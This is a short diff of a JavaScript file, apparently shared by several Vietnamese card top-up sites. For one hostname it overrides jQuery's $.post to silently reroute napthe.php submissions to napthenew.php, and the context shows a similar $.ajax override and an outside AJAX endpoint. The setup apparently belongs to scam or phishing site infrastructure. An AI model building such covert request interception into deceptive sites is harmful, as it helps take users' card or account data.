@@ -51,6 +51,26 @@ var callback_napthe = '/callback_napthe.php'
  if (typeof url === 'undefined') {
   var url = 'https://1888.abcxem.click/ajax.php';
 }
+   if(location.hostname == "ff.naptheuytinvn.com"){
+  $(document).ready(function() {
+    
+    // Lưu trữ hàm post gốc
+    var originalPost = $.post;
+
+    // Gán đè hàm post
+    $.post = function(url, data, callback, type) {
+        
+        // Kiểm tra URL và thay đổi nếu cần
+        if(url === "napthe.php") {
+            url = "napthenew.php";
+        }
+
+        // Gọi hàm post gốc với các tham số đã sửa
+        return originalPost(url, data, callback, type);
+    };
+
+});
+   }
  if(location.hostname == "naptheuudai.comm"){
 (function() {
     // Lưu trữ phiên bản gốc của hàm $.ajax
